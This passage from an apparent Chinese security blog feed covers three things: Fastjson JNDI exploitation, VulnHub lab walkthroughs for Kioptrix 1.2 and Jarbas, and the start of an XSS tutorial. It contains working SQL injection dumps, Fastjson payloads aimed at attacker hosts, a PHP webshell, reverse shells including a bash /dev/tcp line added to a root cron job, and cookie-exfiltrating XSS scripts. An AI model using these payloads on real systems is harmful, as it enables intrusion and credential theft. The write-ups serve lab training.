的首选攻击载体</li></ul><table><thead><tr><th>特性</th><th>RMI</th><th>LDAP</th></tr></thead><tbody><tr><td>协议端口</td><td>1099</td><td>389/636</td></tr><tr><td>响应速度</td><td>较慢</td><td>较快</td></tr><tr><td>JDK限制</td><td>8u121+受限</td><td>8u191+受限</td></tr><tr><td>利用复杂度</td><td>简单</td><td>需配置schema</td></tr></tbody></table><h1>BeanFactory</h1><p>BeanFactory (Spring框架核心)</p><p>Spring 框架的<strong>容器核心</strong>，管理 Bean 的生命周期和依赖注入。</p><h2 id="关键能力"><a class="header-anchor" href="#关键能力">¶</a>关键能力</h2><ul><li>Bean的创建、配置、组装</li><li>依赖注入（DI）实现</li><li>支持多种Bean作用域（singleton/prototype等）</li></ul><h2 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">¶</a>漏洞利用</h2><p>在高级Fastjson漏洞利用中，攻击者可能利用Spring相关类：</p><ol><li>通过特殊Bean触发危险行为（如 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code> 加载恶意XML）</li><li>利用 <code>BeanFactory</code> 的反射能力执行代码</li></ol><p>下面是一个加载恶意XML的例子</p><ul><li>高危类： <code>ClassPathXmlApplicationContext</code></li><li>利用原理：加载恶意 XML 配置文件实现 RCE</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 恶意 spring.xml --&gt;</span><br><span class="line">&lt;bean id=&quot;malicious&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">    &lt;constructor-arg value=&quot;calc.exe&quot;/&gt;</span><br><span class="line">    &lt;property name=&quot;whatever&quot; value=&quot;#&#123;malicious.start()&#125;&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><ul><li>触发方式</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;@type&quot;: &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;,</span><br><span class="line">   &quot;configLocation&quot;: &quot;http://attacker/malicious.xml&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>绕过</h1><h2 id="高版本JDK绕过"><a class="header-anchor" href="#高版本JDK绕过">¶</a>高版本JDK绕过</h2><p>当目标 JDK ≥ 8u191（禁用远程类加载）时：</p><h3 id="绕过方案-1：利用本地-ClassPath-中的-Gadget"><a class="header-anchor" href="#绕过方案-1：利用本地-ClassPath-中的-Gadget">¶</a>绕过方案 1：利用本地 ClassPath 中的 Gadget</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查找目标应用中已有的危险类</span></span><br><span class="line">TypeFactory.loadClass(<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>);</span><br><span class="line">ctx.lookup(<span class="string">&quot;rmi://attacker/controlled&quot;</span>); <span class="comment">// 触发本地类的方法</span></span><br></pre></td></tr></table></figure><h3 id="绕过方案-2：EL-表达式注入-Tomcat-环境"><a class="header-anchor" href="#绕过方案-2：EL-表达式注入-Tomcat-环境">¶</a>绕过方案 2：EL 表达式注入 (Tomcat 环境)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 利用 javax.el.ELProcessor</span></span><br><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;)&quot;</span></span><br><span class="line">               + <span class="string">&quot;.newInstance().getEngineByName(&#x27;JavaScript&#x27;)&quot;</span></span><br><span class="line">               + <span class="string">&quot;.eval(&#x27;new java.lang.ProcessBuilder(\&quot;calc\&quot;).start()&#x27;)&#125;&quot;</span>;</span><br><span class="line">ctx.lookup(<span class="string">&quot;ldap://attacker/&quot;</span> + URLEncoder.encode(payload));</span><br></pre></td></tr></table></figure><h3 id="绕过方案-3：反序列化-Gadget-链"><a class="header-anchor" href="#绕过方案-3：反序列化-Gadget-链">¶</a>绕过方案 3：反序列化 Gadget 链</h3><p>结合本地存在的 CC/ROME 等链：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;yv66vgAA...恶意字节码...&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pwn&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h1>总结</h1><p>关键路径：</p><ol><li>恶意json构造让Fastjson解析</li><li>调用危险方法执行JNDI lookup</li><li>利用RMI或LDAP协议返回Reference加载远程恶意类</li><li>最后系统执行</li></ol>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kioptrix-1.2</title>
      <link href="/article/Kioptrix-1-2/"/>
      <url>/article/Kioptrix-1-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Kioptrix: 1.2</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">vulnhub靶场-Kioptrix: 1.2</a></p><p>目标: 也许是get root</p><p>提示: Important thing with this challenge. Once you find the IP (DHCP Client) edit your hosts file and point it to <a href="http://kioptrix3.com">kioptrix3.com</a></p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.110.130</li><li>target: 192.168.110.132</li></ul><p>注意要将ip指向域名<code>kioptrix3.com</code>, 修改<code>/etc/hosts</code></p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取靶机地址 192.168.110.132</span></span><br><span class="line">sudo nmap -sn 192.168.110.0/24</span><br><span class="line"><span class="comment"># 获取端口信息 22,80</span></span><br><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.110.132 -oA scan/ports</span><br><span class="line"><span class="comment"># 获取详细信息</span></span><br><span class="line">sudo nmap -sT -sV -sC -O -p22,80 192.168.110.132 -oA scan/detail</span><br><span class="line"><span class="comment"># 看看漏洞</span></span><br><span class="line">sudo nmap --script=vuln -p22,80 192.168.110.132 -oA scan/vuln</span><br></pre></td></tr></table></figure><p>目录扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/core</span><br><span class="line">/cache</span><br><span class="line">/favicon.ico</span><br><span class="line">/gallery</span><br><span class="line">/modules</span><br><span class="line">/phpmyadmin</span><br><span class="line">/update.php</span><br></pre></td></tr></table></figure><p>后台登录 , 尝试<code>admin : admin</code>, 失败phpmyadmin, 尝试<code>root : </code>, 失败update.php, permission denied</p><p>还是来看看lotuscms的漏洞吧,</p><p>经过测试确实存在sql注入漏洞, 当输入<code>order by 7</code>出现报错, 所以是6列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 判断列数</span><br><span class="line">http://kioptrix3.com/gallery/gallery.php?id=-1 order by 7 --</span><br><span class="line"># 判断显示位</span><br><span class="line">http://kioptrix3.com/gallery/gallery.php?id=-1 union select 1,2,3,4,5,6 --</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250615201714.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 看看数据库 gallery</span><br><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,database(),4,5,6 --</span><br><span class="line"></span><br><span class="line"># 看看表名 gallarific_users, dev_accounts</span><br><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;gallery&#x27;),4,5,6--</span><br><span class="line"></span><br><span class="line"># 看看表内字段名 username, password</span><br><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;gallarific_users&#x27;),4,5,6 --</span><br><span class="line"></span><br><span class="line"># 看看内容</span><br><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,(select group_concat(username,&#x27;-&#x27;,password) from gallery.dev_accounts),4,5,6--</span><br></pre></td></tr></table></figure><p><code>dreg-0d3eccfb887aabd50f243b3f155c0f85</code><code>loneferret-5badcaf789d3d1d09794d8f021f40f0e</code></p><p>查询到了两个账号和它们对应密码的MD5加密密文, 通过在线网站解密</p><p><code>dreg : Mast3r</code>, <code>loneferret : starwars</code></p><blockquote><p>找到的文章就是用的这个靶机做例子说的lotusCMS的sql注入</p></blockquote><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>拿到的账密无法用于登录网站后台, 但是dreg可以用于登录ssh</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss dreg@192.168.110.132</span><br></pre></td></tr></table></figure><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><p>bash进入存在限制, 不过好在可以使用python</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 2.6.24-24-server</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看发行版的信息, Ubuntu 8.04.3 LTS</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 查看权限, 无</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 查看特权文件, 无发现</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 看看计划任务, 无发现</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>前往<code>/usr/lonefeerret</code>目录, 找到一个可疑的sh程序, 查看旁边的README</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你好，新员工，</span><br><span class="line">使用我们新安装的软件编辑、创建和查看文件是公司的政策。</span><br><span class="line">请使用命令“sudo ht”。</span><br><span class="line">如果不这样做，你将被立即解雇。</span><br><span class="line"></span><br><span class="line">DG</span><br><span class="line">首席执行官</span><br></pre></td></tr></table></figure><p>运行, 发现报错, 寻找解决方法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Error opening terminal: xterm-256color.</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure><p>现在发现一个问题, ht这个编辑器是使用sudo执行的, 所以我们可以将这个用户的sudo权限修改成和root相同的</p><p><strong>sudo执行命令的流程 </strong></p><p>当用户执行sudo时，系统会主动寻找<code>/etc/sudoers</code>文件，判断该用户是否有执行sudo的权限–&gt;确认用户具有可执行sudo的权限后，让用户输入用户自己的密码确认–&gt;若密码输入成功，则开始执行sudo后续的命令</p><p>所以直接修改<code>/etc/sudoers</code>即可</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>刚执行完<code>sudo ht</code>, 使用F3打开<code>/etc/sudoers</code>文件并进行编辑, 给他改成这样</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250616110848.png" alt="image.png"></p><p><code>F2</code>保存即可, 回去试试<code>sudo -l</code>, 不用想肯定是ALL, 那就已经结束辣</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250616111404.png" alt="image.png"></p><h1>其他</h1><p>在<code>/home/www/kioptrix3.com/gallery</code>目录下有个<code>gconfig.php</code>, 里面有数据库交互的账号密码</p><p><code>root : fuckeyou</code></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> sudoers提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jarbas-1</title>
      <link href="/article/jarbas-1/"/>
      <url>/article/jarbas-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>title</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/jarbas-1,232/">vulnhub靶场-jarbas: 1</a></p><p>目标: Get root shell!</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.146.6</li><li>target: 192.168.146.5</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取靶机地址 192.168.146.5</span></span><br><span class="line">sudo nmap -sn 192.168.146.0/24</span><br><span class="line"><span class="comment"># 获取端口信息 22,80,3306,8080</span></span><br><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.146.5 -oA scan/ports</span><br><span class="line"><span class="comment"># 获取详细信息</span></span><br><span class="line">sudo nmap -sT -sV -sC -O -p22,80,3306,8080 192.168.146.5 -oA scan/detail</span><br><span class="line"><span class="comment"># 看看漏洞</span></span><br><span class="line">sudo nmap --script=vuln -p22,80,3306,8080 192.168.146.5 -oA scan/vuln</span><br></pre></td></tr></table></figure><p>扫漏洞的时候发现8080端口有一个robots.txt, 访问有提示, 看不懂是什么</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># we don&#x27;t want robots to click &quot;build&quot; links</span><br></pre></td></tr></table></figure><p>扫一下目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.146.5</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- Scanning URL: http://192.168.146.5/ ----</span></span><br><span class="line"><span class="comment"># + http://192.168.146.5/access.html (CODE:200|SIZE:359)</span></span><br><span class="line"><span class="comment"># + http://192.168.146.5/index.html (CODE:200|SIZE:32808) </span></span><br><span class="line"><span class="comment"># 扫不到可以加上 -X .html 参数</span></span><br></pre></td></tr></table></figure><p>访问80端口, 发现是Jenkins cms, 这个cms经过搜索有默认密码, 且存在后台漏洞, 所以看看能不能先登录进去. 尝试部分弱密码, 没法登录, 先看看其他部分</p><p>访问之前扫描到的<code>access.html</code>, 发现疑似是用户名和密码的md5</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250625110751.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiago:5978a63b4654c73c60fa24f836386d87</span><br><span class="line">trindade:f463f63616cb3f1e81ce46b39f882fd5</span><br><span class="line">eder:9b38e2b1e8b12f426b0d208a7ab6cb98</span><br></pre></td></tr></table></figure><p>不确定可以用<code>hash-identifier</code>工具确认一下加密方式, 解密结果如下, <a href="https://www.json.cm/md5decrypt/">解密网址</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiago:italia99</span><br><span class="line">trindade:marianna</span><br><span class="line">eder:vipsu</span><br></pre></td></tr></table></figure><p>拿到的账号密码用于在8080登录, 测试发现仅有<code>eder:vipsu</code>可以登陆</p><blockquote><p>试过ssh了, 不行</p></blockquote><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p><a href="https://blog.csdn.net/weixin_40412037/article/details/120369441">参考文章</a>, 根据文章内容可以非常轻易复现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">println &quot;whoami&quot;.execute().text</span><br><span class="line">println &quot;ifconfig&quot;.execute().text</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250625112544.png" alt="image.png"></p><p>结合前面的信息收集中, nmap认为这是一个linux系统, 我们尝试写马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new File(&quot;/var/www/html/shell.php&quot;).write(&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure><p>被告知用户没有权限在这个目录下进行编辑, 看一下权限, 果然是root</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">println &quot;ls -ld /var/www/html&quot;.execute().text</span><br></pre></td></tr></table></figure><p>换一种方法吧, 反正可以执行命令, 上传一个反弹shell然后执行; 自行创建文件并配置简单服务器, 顺手监听1234</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.146.6&quot;</span>,<span class="number">1234</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过网站下载该文件, 并执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">println &quot;wget http://192.168.146.6:8000/shell.php -P /tmp/&quot;.execute().text</span><br><span class="line">println &quot;php /tmp/shell.php&quot;.execute().text</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250625121242.png" alt="image.png"></p><p>成功拿到shell</p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux jarbas 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 3.10.0-693.21.1.el7.x86_64</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看发行版的信息 CentOS Linux release 7.4.1708 (Core)</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*release</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line"><span class="comment"># 查看权限, 无</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 查看特权文件, 无发现</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 看看计划任务, 发现一个用root权限启动的脚本</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>存在python, 利用python起一个新的交互式shell, 我说妙妙工具真好用</p><p>来看看这个计划任务, 每五分钟执行一次</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>先来看看权限, 是777, 任何人可以编辑这个sh文件, 那么我认为这就是提权的方式了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -ld /etc/script/CleaningScript.sh</span><br><span class="line"><span class="comment"># -rwxrwxrwx. 1 root root 50 Apr  1  2018 /etc/script/CleaningScript.sh</span></span><br></pre></td></tr></table></figure><p>看看内容, 是一个自动删除<code>/var/log/httpd/access_log.txt</code>的脚本</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>在这个脚本后追加内容, 让它反弹shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.146.6/5555 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/script/CleaningScript.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250625123050.png" alt="image.png"></p><p>拿到root权限, <code>/root</code>目录下有flag, 可以拿拿</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/article/xss/"/>
      <url>/article/xss/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>XSS</h1><p>XSS(Cross Site Scripting, 跨站脚本攻击), 指的是将恶意代码语句嵌入到当前网页(反射型XSS)或存储到Web应用的数据库(存储型XSS)中, 引诱受害者访问含有恶意代码的网页, 使得恶意代码被执行</p><p>主要的目的有获取受害者cookie等登录凭证, 以此来获取操作权限</p><h1>位置</h1><p>留言板, 搜索框, 个人资料, 公告, 编辑器等</p><h1>分类</h1><p>分为反射型, 存储型, DOM型. 最大的不同可能是数据流经的路径不同</p><h2 id="反射型"><a class="header-anchor" href="#反射型">¶</a>反射型</h2><p>又称为非持久型, 参数型跨站脚本. 它需要欺骗用户自己去点击链接才能触发XSS代码</p><p>一般容易出现在搜索页面、输入框、URL参数处, 大多数是用来盗取用户的Cookie信息</p><p>数据流向为: 前端-&gt;后端-&gt;前端</p><h2 id="存储型"><a class="header-anchor" href="#存储型">¶</a>存储型</h2><p>又称为持久型跨站脚本, 它的代码是存储在服务器中的. 只需要受害者访问这个界面就会触发</p><p>一般出现在、评论、博客日志等于用户交互处, 容易造成蠕虫、盗窃cookie</p><p>数据流向: 前端–&gt;后端–&gt;数据库–&gt;后端–&gt;前端</p><h2 id="DOM型"><a class="header-anchor" href="#DOM型">¶</a>DOM型</h2><p>DOM是指文档对象模型(Document Object Model), 处理可扩展标记语言的标准编程接口, 程序和脚本可以动态访问和修改文档的内容、结构和样式</p><p>DOM-XSS漏洞是基于文档对象模型（Document Objeet Model，DOM）的一种漏洞，不经过后端，DOM-XSS是通过url传入参数去控制触发的, 其实也属于反射型XSS</p><p><strong>DOM-XSS不与后台交互</strong></p><p>数据流向: 前端-&gt;浏览器</p><h1>利用</h1><h2 id="验证漏洞"><a class="header-anchor" href="#验证漏洞">¶</a>验证漏洞</h2><p>尝试最基础的<code>利用HTML标签属性值执行XSS</code>, 看看是否存在漏洞</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 通过javascript:[code]伪协议形式编写恶意脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript.:alert(&#x27;1&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后可以<code>利用&lt;&gt;标记注射HTML、JavaScript</code>用于获取当前用户的cookie.</p><p>这段代码将访问的用户的cookie将其作为参数拼接到请求中并进行一次访问. 你开设的服务器要有http服务用于接收请求</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> myimg = <span class="keyword">new</span> <span class="title class_">Image</span>(); myimg.<span class="property">src</span> = <span class="string">&#x27;http://192.168.56.5/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>真实情况下, 需要被按到的时候才会触发, 靶机一般会有bot帮你自动触发</p><p>还有一些简单的案例</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 利用基本的script标签来弹窗--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 利用iframe标签的src属性来弹窗--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 利用标签的href属性来弹窗--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 利用img标签的onerror事件来弹窗,当装载文档或图像发生错误时触发onerror事件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">scr</span>=<span class="string">1</span> <span class="attr">οnerrοr</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 利用img标签的onclick事件来弹窗,只要点击鼠标就会触发弹窗事件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">“http://www.baidu.com/img/logo.gif”</span> <span class="attr">οnclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">scr</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>加载图像成功触发onload, 加载图像失败触发onerror</p></blockquote><h2 id="反弹Cookie"><a class="header-anchor" href="#反弹Cookie">¶</a>反弹Cookie</h2><p><strong>本地XSS</strong>最常见的方法是调用<code>alert(document.cookie)</code>实现</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>服务器反弹cookie</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://127.0.0.1/?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://127.0.0.1/?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然可以写一个php文件用于接收, 但是直接开一个python简易服务器就能满足大部分需要</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 将得到的内容写进cookie.lst</span></span><br><span class="line"> <span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.lst&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">fputs</span>(<span class="variable">$file</span>,<span class="string">&quot;<span class="subst">$cookie</span>\r\n&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1>绕过</h1><h2 id="利用HTML标签的属性值-伪协议"><a 